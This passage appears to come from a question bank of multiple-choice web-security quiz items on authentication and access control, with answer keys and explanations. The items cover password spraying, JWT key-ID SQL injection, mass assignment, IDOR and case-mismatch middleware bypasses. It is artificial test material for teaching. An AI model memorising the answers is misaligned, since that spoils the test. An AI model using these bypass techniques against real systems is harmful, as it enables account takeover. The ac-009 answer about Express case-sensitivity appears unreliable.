    question: "Consider this password reset code:\n```python\ntoken = secrets.token_hex(32)\nreset_tokens[token] = {'user': email, 'expires': time.time() + 600}\n# Later, during verification:\nif request.args['token'] in reset_tokens:\n    if reset_tokens[request.args['token']]['expires'] > time.time():\n        allow_reset()\n        # BUG: token not deleted here\n```\nWhat is the security impact of the marked bug?"
    options:
      - a: "Token reuse — the reset token remains valid until expiry, allowing anyone who intercepts it to reset the password multiple times or even after the user has already reset it"
      - b: "Memory exhaustion — accumulated tokens will eventually crash the server"
      - c: "No real impact — the token expires after 10 minutes anyway, so the window is already small"
      - d: "Race condition — two concurrent requests could both pass the check and reset the password to different values"
    answer: "a"
    explanation: "The token should be invalidated immediately after use (single-use). Without deletion, if an attacker intercepts the token (from email logs, browser history, referrer headers), they can use it even after the legitimate user has already reset their password — potentially locking the user out or taking over the account repeatedly within the 10-minute window. Option B is negligible — a few tokens don't cause memory issues. Option C dramatically understates the risk — 10 minutes is a long window for token reuse attacks. Option D is a real concern but secondary to the primary token-reuse vulnerability."

  - id: auth-008
    topic: authentication
    type: tricky-concept
    difficulty: advanced
    question: "A developer implements constant-time string comparison for password verification: `hmac.compare_digest(submitted_hash, stored_hash)`. But they hash the password BEFORE this comparison using `hashlib.sha256(password).hexdigest()`. Is there still a timing vulnerability?"
    options:
      - a: "Yes — sha256 takes different amounts of time depending on input length, leaking information about the expected password length"
      - b: "No — the constant-time comparison is the critical defense, and the hashing step doesn't leak useful information because the attacker already knows what they submitted"
      - c: "Yes — sha256's output length varies based on input, so the comparison operates on different-length strings"
      - d: "No — but the approach is flawed because they should use bcrypt instead of sha256 for password hashing"
    answer: "b"
    explanation: "The timing of the hash operation doesn't leak useful information because the attacker already knows their own input and its length. The critical timing leak would be in the comparison step, which is properly protected by compare_digest. Option A is wrong — while sha256 technically processes different numbers of blocks for different input lengths, this doesn't leak information about the STORED password. Option C is wrong — sha256 always produces a fixed-length output (64 hex characters). Option D identifies a real best-practice issue (sha256 is too fast for passwords) but answers a different question than what was asked."

  - id: auth-009
    topic: authentication
    type: scenario
    difficulty: advanced
    question: "You're testing an API that uses JWTs with the 'kid' (Key ID) header parameter to select which key to verify the signature against. Keys are fetched from a database. What is the MOST dangerous attack vector?"
    options:
      - a: "SQL injection via the kid parameter — if the server uses the kid value directly in a database query to look up the signing key"
      - b: "Setting kid to point to a predictable static file (like /dev/null or an empty file) so the verification key is empty or null"
      - c: "Brute-forcing kid values to find a weak or test key that was accidentally left in the key database"
      - d: "Setting kid to a URL pointing to an attacker's server that returns a key the attacker controls"
    answer: "a"
    explanation: "If the kid parameter is used in a SQL query without parameterization (e.g., `SELECT key FROM keys WHERE id = '$kid'`), an attacker can inject SQL to return an arbitrary value as the key, then sign the JWT with that known value. This gives complete token forgery. Option B is real but requires knowledge of the server's file system and that it falls back to file-based lookup. Option C is possible but slow and noisy. Option D depends on the server fetching remote keys based on kid, which is unusual for database-backed key stores."

  - id: auth-010
    topic: authentication
    type: defense-bypass
    difficulty: intermediate
    question: "A site prevents brute force by locking accounts after 5 failed attempts. What is the MOST effective attack strategy that avoids triggering the lockout?"
    options:
      - a: "Password spraying — try one common password against thousands of accounts, then try the next password, staying under 5 attempts per account"
      - b: "Credential stuffing from a breach database — these are known-valid credentials so they're less likely to trigger lockout"
      - c: "Wait for the lockout timer to expire between each batch of 5 attempts and continue"
      - d: "Use a CAPTCHA solver to bypass the lockout mechanism which typically uses CAPTCHA as its enforcement"
    answer: "a"
    explanation: "Password spraying inverts the brute-force approach: instead of many passwords against one account, you try one password against many accounts. Each account sees at most 1-2 attempts, far below the lockout threshold. With common passwords like 'Password1!' the hit rate is surprisingly high. Option B is effective but is a different attack category — and it still triggers lockout if the stolen credentials are outdated. Option C works but is extremely slow and the account holder may notice repeated lockouts. Option D incorrectly assumes lockout is CAPTCHA-based — account lockout is typically separate from CAPTCHA."

  - id: auth-011
    topic: authentication
    type: scenario
    difficulty: advanced
    question: "A password reset endpoint accepts email addresses and always responds with 'If an account exists, a reset link has been sent.' to prevent user enumeration. However, an attacker can STILL enumerate accounts. What is the MOST reliable method?"
    options:
      - a: "Measure response times — the server takes slightly longer when it actually generates and sends an email versus when it doesn't"
      - b: "Try to register new accounts with those email addresses — the registration form may disclose whether the email is already taken"
      - c: "Check for differences in HTTP response headers (Set-Cookie, Cache-Control) between existing and non-existing accounts"
      - d: "Analyze the response body character by character for invisible differences like extra whitespace or hidden fields"
    answer: "a"
    explanation: "Even with identical response messages, the server-side processing differs: for valid accounts, it generates a token, queries the database, composes an email, and calls an SMTP server — all of which take measurable time. For invalid accounts, it returns almost immediately. This timing side-channel is extremely common. Option B is a real enumeration vector but targets the registration endpoint, not the password reset. Option C is occasionally possible but most frameworks standardize headers. Option D is very unlikely — templating engines produce consistent output."

  - id: auth-012
    topic: authentication
    type: tricky-concept
    difficulty: advanced
    question: "An application sets a session cookie with these flags: `Secure; HttpOnly; SameSite=Lax; Path=/`. Under which scenario can an attacker still steal this session cookie?"
    options:
      - a: "Via a subdomain takeover — if an abandoned subdomain can be claimed, cookies set without a Domain attribute are still accessible to parent domain subdomains"
      - b: "Via XSS — HttpOnly only prevents document.cookie access, but XMLHttpRequest and fetch() can still read the cookie header from responses"
      - c: "Via a man-in-the-middle attack on the same domain over HTTP — the Secure flag doesn't apply if the attacker is on the same network"
      - d: "Via a browser extension or malicious browser — cookie flags are only enforced by standards-compliant browsers"
    answer: "d"
    explanation: "Cookie security flags are enforced by the browser. A malicious browser extension with appropriate permissions or a compromised browser can access any cookie regardless of flags. All cookie protections assume a trustworthy user agent. Option A is wrong — cookies set WITHOUT a Domain attribute are actually MORE restrictive: they're only sent to the exact origin that set them (not subdomains). This is the opposite of what the option claims. Option B is wrong — HttpOnly prevents all JavaScript access to the cookie, including reading it from response headers via XHR/fetch. Option C is wrong — the Secure flag prevents the cookie from being sent over any non-HTTPS connection, regardless of network position."

  # ============================================================
  # ACCESS CONTROL (12 questions)
  # ============================================================

  - id: ac-001
    topic: access-control
    type: tricky-concept
    difficulty: intermediate
    question: "A developer uses UUIDs (v4) for object references instead of sequential IDs, arguing this prevents IDOR. Why is this an insufficient defense?"
    options:
      - a: "UUID v4 has only 2^64 bits of entropy which is brute-forceable with modern GPU clusters"
      - b: "UUIDs may leak through application logs, URLs, API responses, referrer headers, or browser history — obscurity is not access control"
      - c: "UUID v4 generation is predictable if the attacker knows the server's random seed"
      - d: "UUIDs are transmitted as strings which can be manipulated more easily than integer IDs"
    answer: "b"
    explanation: "UUIDs are security through obscurity — they make guessing harder but don't enforce authorization. UUIDs leak through many channels: they appear in URLs (shared/bookmarked), API responses (listing endpoints), logs, referrer headers when clicking external links, and browser history. Once known, they provide the same access as sequential IDs. Option A is wrong — UUID v4 has 122 random bits, which IS infeasible to brute-force. Option C is wrong — UUID v4 uses cryptographically secure random generators, not predictable seeds. Option D is irrelevant — string vs integer format has no bearing on authorization."

  - id: ac-002
    topic: access-control
    type: scenario
    difficulty: advanced
    question: "An API uses a PUT endpoint: `PUT /api/users/{id}` which accepts JSON to update user profiles. The API only expects `{\"name\": \"...\", \"email\": \"...\"}`. An attacker sends `{\"name\": \"...\", \"role\": \"admin\"}`. What vulnerability class is this?"
    options:
      - a: "Mass assignment (also called auto-binding) — the framework automatically binds all JSON fields to the user model, including privileged fields like role"
      - b: "Parameter pollution — the extra field causes the API to process duplicate parameters with undefined behavior"
      - c: "IDOR — the attacker is modifying their own profile but adding fields that belong to a different authorization scope"
      - d: "Server-side request forgery — the role field could trigger an internal API call to the authorization service"
    answer: "a"
    explanation: "Mass assignment occurs when frameworks (Rails, Django, Express with body-parser, etc.) automatically bind ALL incoming JSON/form fields to the data model. If 'role' is a field on the User model and there's no explicit allowlist, the framework blindly updates it. Option B describes HTTP parameter pollution which involves duplicate parameter names, not extra fields. Option C is wrong — IDOR is about accessing OTHER users' resources, not elevating your own privileges. Option D is incorrect — adding a JSON field doesn't trigger SSRF."

  - id: ac-003
    topic: access-control
    type: defense-bypass
    difficulty: advanced
    question: "A REST API implements role-based access control (RBAC) with middleware that checks permissions on every endpoint. The middleware uses pattern matching: `/api/admin/*` requires admin role. Which request might bypass this?"
    options:
      - a: "`GET /api/admin/../admin/users` — path traversal confuses the pattern matcher into not recognizing the admin path"
      - b: "`GET /api/Admin/users` — case-sensitive pattern matching fails on the different case, but the router is case-insensitive"
      - c: "`GET /api/admin/users.json` — adding a file extension bypasses the wildcard pattern"
      - d: "`GET /api/admin%2fusers` — URL-encoded slash bypasses the middleware pattern but is decoded by the backend router"
    answer: "b"
    explanation: "If the RBAC middleware uses case-sensitive matching (`/api/admin/*`) but the underlying router handles routes case-insensitively, then `/api/Admin/users` bypasses the check but still routes to the admin endpoint. This is a classic case normalization mismatch. Option A is typically handled — most middleware frameworks normalize path traversal sequences before matching. Option C is wrong — `*` wildcards typically match everything including dots and extensions. Option D is plausible but most frameworks normalize URL encoding before routing, so this is less reliable than case mismatch."

  - id: ac-004
    topic: access-control
    type: attack-chain
    difficulty: intermediate
    question: "You discover that a regular user can access `GET /api/admin/users` which lists all users with their email addresses. The endpoint correctly returns 403 for POST/PUT/DELETE requests. What is the MOST impactful thing you can do with this information?"
    options:
      - a: "Harvest the user list for targeted phishing or credential stuffing attacks against the admin accounts"
      - b: "Use the email addresses to enumerate password reset tokens for each user"
      - c: "Nothing impactful — read-only access to a user list is an informational finding, not exploitable"
      - d: "Leverage the user IDs from the listing to attempt IDOR attacks against other endpoints that may not properly validate authorization"
    answer: "d"
    explanation: "The user listing likely exposes internal user IDs, which can be used to probe other API endpoints for IDOR vulnerabilities. Endpoints like `/api/users/{id}/documents`, `/api/users/{id}/payment-methods` might have their own authorization flaws. Option A is useful but is an indirect attack that requires additional steps. Option B makes an incorrect leap — knowing emails doesn't help enumerate reset tokens. Option C significantly underestimates the risk — information disclosure is often the first step in a chain. Option D represents the most direct technical escalation path."

  - id: ac-005
    topic: access-control
    type: scenario
    difficulty: advanced
    question: "An e-commerce site displays order history for the logged-in user at `/orders?user_id=123`. Changing user_id to 124 shows another user's orders. The developer adds a server-side check: `if request.params['user_id'] != session.user_id: return 403`. Is this fix complete?"
    options:
      - a: "Yes — the fix ensures the user can only access their own orders by validating the user_id matches the session"
      - b: "No — the user_id parameter is now redundant and should be removed entirely; the server should always use session.user_id to fetch orders"
      - c: "No — the check should use type-safe comparison (=== in JavaScript) because '123' != 123 would incorrectly deny access"
      - d: "No — the fix only works for GET requests; the attacker could still modify orders via PUT/DELETE with a different user_id"
    answer: "b"
    explanation: "The fundamental flaw is that the endpoint accepts a user ID from the client when it already has the authenticated user's identity in the session. The correct fix is to remove the user_id parameter entirely and always use `session.user_id` to determine whose orders to fetch. This eliminates the IDOR class of vulnerability by design rather than adding validation. Option A is wrong because keeping the parameter at all is an unnecessary attack surface. Option C raises a real concern but it's a secondary implementation detail, not the primary issue. Option D is valid but is a separate endpoint concern."

  - id: ac-006
    topic: access-control
    type: tricky-concept
    difficulty: intermediate
    question: "What is the key difference between horizontal and vertical privilege escalation? An attacker has a regular user account."
    options:
      - a: "Horizontal: accessing another regular user's data. Vertical: accessing admin functionality. Both exploit missing authorization checks but at different levels."
      - b: "Horizontal: exploiting multiple vulnerabilities in sequence. Vertical: exploiting a single vulnerability to gain elevated access."
      - c: "Horizontal: attacks that work across different pages. Vertical: attacks that work within a single page's functionality."
      - d: "Horizontal: accessing resources at the same API path. Vertical: accessing resources at a different API path that requires higher privileges."
    answer: "a"
    explanation: "Horizontal escalation means accessing resources of users at the same privilege level (user A reading user B's data). Vertical escalation means gaining access to higher-privilege functionality (regular user accessing admin features). Option B incorrectly redefines these as attack complexity metrics. Option C incorrectly maps them to page-level scope. Option D incorrectly ties them to API path structure — the path isn't what determines the escalation type; the privilege level required is."

  - id: ac-007
    topic: access-control
    type: defense-bypass
    difficulty: advanced
    question: "An application uses an API gateway that enforces authorization. Direct access to backend microservices is supposed to be blocked by network rules. An attacker discovers an SSRF vulnerability in one of the services. How does this bypass access control?"
    options:
      - a: "SSRF from within the trusted network bypasses the API gateway entirely — internal service-to-service calls typically skip authorization because they trust the network boundary"
      - b: "SSRF lets the attacker modify the API gateway's configuration to disable authorization checks"
      - c: "SSRF allows the attacker to steal the API gateway's TLS certificates, enabling man-in-the-middle attacks on the gateway"
      - d: "SSRF lets the attacker reach the authorization database directly and modify their own permissions"
    answer: "a"
    explanation: "In microservice architectures, the API gateway often handles all authentication/authorization, and internal services trust requests from within the network. SSRF from any internal service can directly call other internal services without going through the gateway, completely bypassing all authorization checks. Option B is possible but unlikely — API gateway configurations are typically not accessible via arbitrary HTTP calls. Option C is wrong — SSRF doesn't enable TLS certificate theft in any straightforward way. Option D is possible but requires the authorization database to be accessible via HTTP, which is unusual."

  - id: ac-008
    topic: access-control
    type: scenario
    difficulty: advanced
    question: "A GraphQL API has a query like `user(id: ID!) { name, email, role }`. The resolver checks that the requesting user can only query their own data. However, the schema also exposes `order(id: ID!) { items, user { name, email, role } }`. What vulnerability exists?"
    options:
      - a: "The order resolver may not implement the same authorization checks — an attacker can access any user's data by querying through the order's nested user relationship"
      - b: "GraphQL introspection reveals the schema, allowing the attacker to discover hidden admin-only fields"
      - c: "The attacker can use GraphQL aliases to bypass rate limiting and brute-force user IDs through the user query"
      - d: "The nested query depth causes exponential database queries, enabling a denial-of-service attack"
    answer: "a"
    explanation: "This is a classic GraphQL authorization bypass via nested resolvers. Even if the `user` query resolver enforces access control, the `user` field resolver on the Order type may not have its own authorization checks. The attacker queries `order(id: 'any-order-id') { user { name, email, role } }` to read other users' data via a different resolution path. Option B describes information disclosure, not access control bypass. Option C describes a different attack (brute-force). Option D describes a resource exhaustion attack, not an authorization bypass."

  - id: ac-009
    topic: access-control
    type: spot-the-vuln
    difficulty: intermediate
    question: "Consider this Express.js middleware:\n```javascript\napp.use('/admin', (req, res, next) => {\n  if (req.user.role !== 'admin') return res.status(403).send('Forbidden');\n  next();\n});\n```\nA non-admin user accesses `/Admin/dashboard` and gets through. What happened?"
    options:
      - a: "Express.js route matching is case-insensitive by default, but the middleware path string is matched case-sensitively before being passed to Express's router"
      - b: "The app.use() middleware is only applied to exact path matches, not prefix matches like `/admin/dashboard`"
      - c: "Express.js treats middleware paths case-sensitively by default, so `/Admin` doesn't match `/admin`, but route handlers may match case-insensitively depending on configuration"
      - d: "The !== comparison fails because req.user.role is undefined for non-admin users, which doesn't strictly not-equal 'admin'"
    answer: "c"
    explanation: "Express.js app.use() does case-sensitive path matching by default. The request to `/Admin/dashboard` doesn't match the `/admin` middleware, so the authorization check is skipped entirely. However, if the downstream route handler or static file serving is case-insensitive (common on Windows or with certain configurations), the request still resolves successfully. Option A gets the behavior backwards. Option B is wrong — app.use() IS a prefix match, but that's not the issue here. Option D is wrong — if req.user.role were undefined, `undefined !== 'admin'` evaluates to true, which would correctly block access."

  - id: ac-010
    topic: access-control
    type: defense-bypass
    difficulty: advanced
    question: "A REST API checks admin access by verifying a `role` field in the JWT. An attacker can't forge JWTs but discovers the `/api/users/me` endpoint allows PATCH requests. They send `PATCH /api/users/me` with `{\"role\": \"admin\"}`. The API returns 200 but their JWT still shows `role: user`. Is the attack successful?"
    options:
      - a: "No — the JWT role wasn't updated, so authorization checks using the JWT will still fail"
      - b: "Yes — but only after the JWT expires and a new one is issued using the updated database role"
      - c: "No — PATCH on /users/me only updates display fields, never authorization fields"
      - d: "Yes — immediately, because the server re-reads the role from the database on each request, not from the JWT"
    answer: "b"
    explanation: "If the PATCH successfully updated the role in the database (indicated by the 200 response), the attack succeeds once a new JWT is issued — typically at next login or token refresh. The current JWT is stale but JWTs are usually short-lived. Option A is temporarily correct but misses the long-term impact. Option C makes an assumption about field filtering that the 200 response contradicts. Option D depends on the architecture — the question states the API checks the JWT's role field, meaning it doesn't query the database on every request."

  - id: ac-011
    topic: access-control
    type: scenario
    difficulty: intermediate
    question: "An API endpoint `/api/documents/{id}` returns documents. Users should only see their own. The developer implements: `SELECT * FROM documents WHERE id = :id AND owner_id = :current_user`. A tester bypasses this. How?"
    options:
      - a: "SQL injection in the :id parameter to comment out the AND clause"
